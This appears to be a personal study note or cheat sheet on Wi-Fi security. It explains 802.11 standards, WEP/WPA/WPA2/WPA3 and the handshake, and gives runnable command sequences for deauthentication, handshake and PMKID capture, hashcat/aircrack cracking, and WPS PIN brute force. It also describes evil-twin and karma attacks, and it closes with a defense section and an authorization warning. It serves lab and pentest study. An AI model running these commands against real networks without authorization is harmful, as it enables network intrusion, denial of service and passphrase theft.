# Wireless (802.11)
 
Wi-Fi fundamentals, security protocols, attacks, and the aircrack-ng ecosystem.
 
> **Reminder:** every attack technique below is for **authorized labs, your own networks, or engagements with written scope**. Wireless attacks against networks you don't own are illegal in nearly every jurisdiction — including "just" capturing traffic in monitor mode on a network you don't own, in many places.
 
---
 
## 802.11 standards
 
The 802.11 family of IEEE standards defines the physical and MAC layers for Wi-Fi.
 
| Standard | Marketing name | Band | Max speed (approx) | Notes |
|---|---|---|---|---|
| 802.11a | — | 5 GHz | 54 Mbps | Early 5 GHz, uncommon now |
| 802.11b | — | 2.4 GHz | 11 Mbps | Legacy, obsolete |
| 802.11g | — | 2.4 GHz | 54 Mbps | Backward compatible with b |
| 802.11n | Wi-Fi 4 | 2.4 / 5 GHz | 600 Mbps | MIMO |
| 802.11ac | Wi-Fi 5 | 5 GHz | ~6.9 Gbps | Wider channels, MU-MIMO |
| 802.11ax | Wi-Fi 6 / 6E | 2.4 / 5 / 6 GHz | ~9.6 Gbps | OFDMA, better density |
| 802.11be | Wi-Fi 7 | 2.4 / 5 / 6 GHz | ~46 Gbps | 320 MHz channels, MLO |
 
### Bands and channels
 
- **2.4 GHz** — longer range, more penetration through walls, but crowded (interference from Bluetooth, microwaves, neighbors). Channels 1, 6, 11 are the non-overlapping US options.
- **5 GHz** — shorter range but way more available channels (36, 40, 44, ..., 165 in the US) and less congestion.
- **6 GHz** (Wi-Fi 6E / 7) — even more spectrum, but only newer devices support it.
Channel width matters: 20 MHz, 40 MHz, 80 MHz, 160 MHz. Wider = faster but more susceptible to interference and less concurrent APs.
 
---
 
## Terminology
 
| Term | Meaning |
|---|---|
| **SSID** | Service Set Identifier — the network name you see |
| **BSSID** | Basic SSID — the MAC address of a specific AP |
| **ESSID** | Extended SSID — the SSID broadcast across multiple APs in the same network |
| **AP** | Access Point — the router / base station |
| **STA** | Station — any client device (laptop, phone, IoT) |
| **PMK** | Pairwise Master Key — derived from passphrase + SSID |
| **PTK** | Pairwise Transient Key — session key derived during the handshake |
| **PMKID** | Identifier derived from PMK; used in a specific attack (see below) |
| **Beacon** | Frame the AP broadcasts announcing itself |
| **Probe request** | Frame a client sends looking for networks |
| **Association** | The step where a client formally joins an AP |
 
---
 
## Frame types
 
802.11 traffic breaks into three frame types:
 
### Management frames
Control the association process. **Unencrypted by default** unless Management Frame Protection (MFP / 802.11w) is enabled.
 
- Beacon (AP advertising)
- Probe request/response (client scan / AP reply)
- Authentication
- Association / Reassociation
- **Deauthentication / Disassociation** ← target of the deauth attack
### Control frames
Manage access to the medium.
- RTS / CTS (Request to Send / Clear to Send)
- ACK
### Data frames
Actual payload traffic. Encrypted when the network uses WEP/WPA/WPA2/WPA3.
 
Understanding the split matters because **management frames are attackable even on secured networks** — that's why deauth attacks work against WPA2.
 
---
 
## Security protocols
 
### Open
 
No encryption. Anything captured in monitor mode is plaintext.
 
### WEP (Wired Equivalent Privacy)
 
**Completely broken.** RC4-based, 24-bit IV that repeats quickly under load. Can be cracked in minutes with enough IVs (`aircrack-ng`). If you ever encounter WEP in the wild, treat it as effectively unencrypted.
 
### WPA (Wi-Fi Protected Access)
 
Interim fix while WPA2 was being finalized. Uses TKIP. Also vulnerable — assume anything using pure WPA is weak.
 
### WPA2
 
Long-standing standard. Uses AES-CCMP. Two flavors:
 
- **WPA2-Personal (PSK)** — pre-shared key (a passphrase). What most home/small-office networks use. Vulnerable to offline dictionary attacks against captured 4-way handshakes or PMKIDs.
- **WPA2-Enterprise** — 802.1X + EAP + RADIUS. Each user has their own credentials or certificate. Much harder to attack; usually requires targeting the auth server, misconfigured EAP, or rogue-AP + credential relay.
### WPA3
 
Modern standard.
- Uses **SAE (Simultaneous Authentication of Equals)** instead of PSK — resistant to offline dictionary attacks
- Requires MFP by default (deauth attacks harder)
- Still not universally deployed; many "WPA3" networks fall back to WPA2 for legacy clients
### WPS (Wi-Fi Protected Setup)
 
Not really a security protocol — a convenience feature that lets clients join by pushing a button or entering an 8-digit PIN. The PIN implementation has a well-known flaw that reduces brute force to ~11,000 attempts (via `reaver` / `bully`). **Disable WPS on any AP you care about.**
 
---
 
## Key exchange: the 4-way handshake
 
When a client authenticates to a WPA/WPA2 PSK network, both sides derive session keys through a **4-way handshake**. Capturing this handshake (specifically, the 2nd or 4th message) lets you attempt an **offline dictionary attack** against the passphrase.
 
```
AP → Client:  ANonce
Client → AP:  SNonce + MIC (proof it knows the PMK)
AP → Client:  GTK + MIC
Client → AP:  ACK
```
 
You don't need to know the passphrase to *capture* the handshake — you just need to see the exchange happen. That's why deauthing a client is useful: it forces reconnection, and you catch the fresh handshake.
 
### PMKID
 
A shortcut. Some APs advertise a PMKID in the first message of the handshake. You can request it directly from the AP without needing a connected client at all — no deauth required. Tool: `hcxdumptool`.
 
---
 
## Monitor mode
 
By default your wireless card operates in **managed mode** — it only receives frames destined for it. To capture other traffic, you need **monitor mode**: the card listens to everything on the channel it's tuned to.
 
Not every card supports monitor mode + packet injection. Popular chipsets that do: Atheros AR9271 (Alfa AWUS036NHA), Realtek RTL8812AU (Alfa AWUS036ACH), Ralink RT3070.
 
### Enable monitor mode with airmon-ng
 
```bash
# Check what's using the wireless interface
sudo airmon-ng check
 
# Kill interfering processes (NetworkManager, wpa_supplicant)
sudo airmon-ng check kill
 
# Put wlan0 into monitor mode → creates wlan0mon
sudo airmon-ng start wlan0
 
# Confirm
iwconfig
# wlan0mon    IEEE 802.11  Mode:Monitor  ...
```
 
### Manual method (works when airmon-ng doesn't)
 
```bash
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
 
# Set channel
sudo iw dev wlan0 set channel 6
```
 
### Back to normal
 
```bash
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```
 
---
 
## Aircrack-ng suite
 
The classic Wi-Fi attack toolkit. Comes with Kali.
 
### airodump-ng — sniff and log
 
```bash
# Passive scan — see nearby networks
sudo airodump-ng wlan0mon
 
# Target a specific BSSID and channel; save capture to file
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
```
 
Output shows:
- **BSSID** — MAC of the AP
- **PWR** — signal strength (closer to 0 = stronger)
- **Beacons** — number seen
- **#Data** — data frames observed
- **CH** — channel
- **ENC / CIPHER / AUTH** — security
- **ESSID** — network name
Below the AP list, connected **STA**s (clients) show up with their MAC and which BSSID they're associated with. This is what you target for a deauth.
 
### aireplay-ng — inject frames
 
**Deauthentication attack** (kicks a client, forcing reconnect → handshake):
```bash
sudo aireplay-ng --deauth 5 \
    -a AA:BB:CC:DD:EE:FF \        # AP BSSID
    -c 11:22:33:44:55:66 \        # target client MAC (omit for broadcast)
    wlan0mon
```
 
`5` = number of deauth frames. Sometimes one is enough; sometimes you'll want a small burst.
 
### aircrack-ng — offline crack
 
After capturing a handshake:
```bash
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```
 
If the wordlist contains the passphrase, you'll see:
```
KEY FOUND! [ Password123! ]
```
 
Success depends entirely on wordlist quality. `rockyou.txt` catches lazy passwords; anything better needs custom wordlists (see `cewl`, `crunch`, or hashcat rules).
 
---
 
## Common attacks
 
### 1. Passive sniffing
 
Monitor mode + airodump-ng. On open networks you see everything in cleartext. On WPA2 you see management frames and encrypted data frames — useful for mapping the environment even without breaking crypto.
 
### 2. Deauth flooding
 
Send continuous deauth frames to kick clients off the network. Used to:
- Force handshake capture (short burst)
- DoS the network (continuous flood)
- Enable evil twin — kick client from real AP so they reconnect to yours
Fails or is degraded against networks with **Management Frame Protection (802.11w)** enabled.
 
### 3. WPA/WPA2 handshake capture + offline crack
 
The bread-and-butter attack.
 
```bash
# 1. Monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0
 
# 2. Find the target
sudo airodump-ng wlan0mon
# Note BSSID and channel
 
# 3. Capture on the target's channel
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
 
# 4. In another terminal — deauth a client to force reconnect
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
 
# 5. When airodump shows "WPA handshake: AA:BB:CC:DD:EE:FF" at the top, you've got it
 
# 6. Crack
sudo aircrack-ng -w rockyou.txt handshake-01.cap
```
 
### 4. PMKID attack
 
No client needed — pull the PMKID directly from the AP if it advertises one.
 
```bash
# hcxdumptool captures the PMKID
sudo hcxdumptool -i wlan0 -o pmkid.pcapng --enable_status=1
 
# Convert to hashcat format
hcxpcapngtool -o pmkid.hash pmkid.pcapng
 
# Crack with hashcat (mode 22000 is the modern universal WPA mode)
hashcat -m 22000 pmkid.hash /usr/share/wordlists/rockyou.txt
```
 
### 5. Evil twin
 
Stand up a fake AP with the same SSID as the target, higher signal strength. Clients associate with yours; you either:
- Present a fake captive portal harvesting the passphrase
- MITM their traffic (open evil twin, harvest cleartext)
- Serve a fake update or exploit
Tools: `airbase-ng`, `hostapd-mana`, `wifiphisher`, `eaphammer` (Enterprise).
 
### 6. Rogue AP
 
Same as an evil twin conceptually, but standalone — plugged into a corporate network to bypass the wireless perimeter, or set up in a public space to capture credentials.
 
### 7. WPS PIN attack
 
Only works against APs with WPS enabled and no lockout protection. Reduces the 8-digit PIN keyspace to ~11,000 due to a design flaw.
 
```bash
# reaver
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
 
# bully (often faster / more reliable)
sudo bully -b AA:BB:CC:DD:EE:FF -c 6 wlan0mon
```
 
Modern APs implement WPS lockout after failed attempts, but old / cheap ones often don't.
 
### 8. Karma / probe response attack
 
Clients periodically send probe requests looking for saved networks ("Are you Starbucks_WiFi?"). A karma-mode AP replies "yes I am" to *every* probe, tricking the client into associating. `hostapd-mana` is the go-to.
 
---
 
## Wifite — automated wireless auditing
 
Wraps the entire aircrack workflow (and more) into a single interactive tool. Kali ships it.
 
```bash
sudo wifite
```
 
Walks you through: pick a target, choose an attack (WPS, PMKID, handshake, WEP), captures and cracks automatically. Great for lab work and initial assessment.
 
---
 
## Other tools
 
| Tool | Purpose |
|---|---|
| **kismet** | Passive WLAN discovery, monitoring, IDS. Better UI than airodump for prolonged captures. |
| **hcxdumptool / hcxtools** | Modern replacement for many aircrack-ng workflows; PMKID capture, hashcat-format conversion. |
| **hostapd-mana** | Advanced rogue-AP framework with Karma, EAP relay, credential harvesting. |
| **eaphammer** | Purpose-built for WPA-Enterprise attacks. |
| **wifiphisher** | Automated phishing over Wi-Fi — fake captive portals, update prompts. |
| **bettercap** | General-purpose network attack framework; strong Wi-Fi module. |
 
---
 
## Cracking captured handshakes with hashcat (GPU)
 
Aircrack-ng is CPU-only. For anything but tiny wordlists, use `hashcat` with a GPU — orders of magnitude faster.
 
```bash
# Convert .cap to hashcat format (older mode 2500)
cap2hccapx handshake-01.cap handshake.hccapx
hashcat -m 2500 handshake.hccapx rockyou.txt
 
# Modern universal mode (works for PMKID and handshakes)
hcxpcapngtool -o handshake.hash handshake-01.cap
hashcat -m 22000 handshake.hash rockyou.txt
 
# With rules
hashcat -m 22000 handshake.hash rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
 
Wordlists worth having:
- **rockyou.txt** — classic, small enough to be quick
- **SecLists** (`sudo apt install seclists`) — huge collection of pentesting wordlists
- **crackstation.txt** — 15GB, expensive but comprehensive
- Custom wordlists via `cewl` (crawl a website), `crunch` (generate by pattern), or company-specific lists
---
 
## Defense
 
### For a home / small-office network
- WPA3 if all devices support it; WPA2-AES otherwise. Never WEP or WPA (TKIP).
- **Long, random passphrase** — the only defense that matters against offline attacks. 20+ characters, ideally passphrase style (`correct-horse-battery-staple` beats `Password123!`).
- **Disable WPS.** No exceptions.
- **Disable SSID broadcast** — theater, not security. Doesn't stop anyone determined; can slightly reduce drive-by targeting.
- **MAC filtering** — theater. MACs are trivial to spoof.
- **Guest network isolation** — real value here; keep IoT and guest devices off the main VLAN.
### For an enterprise
- WPA3-Enterprise or WPA2-Enterprise with **certificate-based EAP-TLS** (not username/password EAP methods that are relay-able).
- Enable **Management Frame Protection (802.11w)**.
- Deploy a **wireless IPS** (Cisco WIPS, Aruba AirWave, etc.) to detect rogue APs and karma attacks.
- Monitor for high-power APs on unexpected channels and for beacons announcing your SSID from unauthorized BSSIDs.
- Physical security matters — rogue APs often get planted by insiders or in poorly monitored spaces.
### For clients / users
- **Turn off "auto-connect to saved networks"** — kills the karma probe attack.
- **Prune saved networks** — remove `Starbucks_WiFi` etc. after you leave.
- **Use a VPN on public Wi-Fi.** Open networks or ones that don't isolate clients let anyone on the LAN see your traffic pre-TLS.
- **Verify HTTPS.** Cert warnings on Wi-Fi you don't control are a strong evil-twin / captive-portal-MITM signal.
---
 
## Quick reference
 
```
Get into monitor mode:
    sudo airmon-ng check kill
    sudo airmon-ng start wlan0
 
Scan for networks:
    sudo airodump-ng wlan0mon
 
Target a specific AP:
    sudo airodump-ng -c <ch> --bssid <bssid> -w cap wlan0mon
 
Deauth a client:
    sudo aireplay-ng --deauth 5 -a <bssid> -c <client_mac> wlan0mon
 
Crack captured handshake:
    aircrack-ng -w rockyou.txt cap-01.cap
    # or (faster with GPU)
    hcxpcapngtool -o hash cap-01.cap
    hashcat -m 22000 hash rockyou.txt
 
Automated:
    sudo wifite
```
